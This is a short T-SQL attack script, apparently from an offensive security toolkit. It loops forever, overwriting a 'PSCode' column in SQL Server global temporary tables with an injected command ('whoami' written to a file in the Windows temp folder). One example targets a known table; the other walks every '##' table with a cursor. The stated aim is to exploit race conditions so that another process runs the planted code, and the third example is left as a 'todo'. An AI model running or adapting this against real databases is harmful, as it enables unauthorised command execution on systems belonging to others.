-------------------------------------------------------
-- Script: Get-GlobalTempTable-RaceUpdate
-- Author: Scott Sutherland
-- Description: 
-- Update contents of all global temp tables using
-- user defined code, this can be useful for exploiting 
-- some race conditions.
-------------------------------------------------------

------------------------------------------------------
-- Example 1: Known Table, Known Column
------------------------------------------------------

-- Loop forever
WHILE 1=1 
BEGIN	
	-- Update table contents with custom powershell script
	DECLARE @mycommand varchar(max)
	SET @mycommand = 'UPDATE t1 SET t1.PSCode = ''whoami > c:\windows\temp\finishline.txt'' FROM ##temp123  t1'		
	EXEC(@mycommand)	
END

------------------------------------------------------
-- Example 2: Unknown Table, Known Column
------------------------------------------------------

-- Loop forever
WHILE 1=1 
BEGIN	
	-- Slow down if needed
	waitfor delay '0:0:0'

	-- Setup variables
	DECLARE @mytempname varchar(max)
	DECLARE @psmyscript varchar(max)

	-- Iterate through all global temp tables 
	DECLARE MY_CURSOR CURSOR 
		FOR SELECT name FROM tempdb.sys.tables WHERE name LIKE '##%'
	OPEN MY_CURSOR
	FETCH NEXT FROM MY_CURSOR INTO @mytempname 
	WHILE @@FETCH_STATUS = 0
	BEGIN 	    
		-- Print table name
		PRINT @mytempname 
	
		-- Update contents of known column with ps script in an unknown temp table
		DECLARE @mycommand varchar(max)
		SET @mycommand = 'UPDATE t1 SET t1.PSCode = ''whoami > c:\windows\temp\finishline.txt'' FROM ' + @mytempname + '  t1'
		EXEC(@mycommand)
	
		-- Next record
		FETCH NEXT FROM MY_CURSOR INTO @mytempname  
	END
	CLOSE MY_CURSOR
	DEALLOCATE MY_CURSOR
END

------------------------------------------------------
-- Example 2: Unknown Table, Unkown column
------------------------------------------------------
-- todo

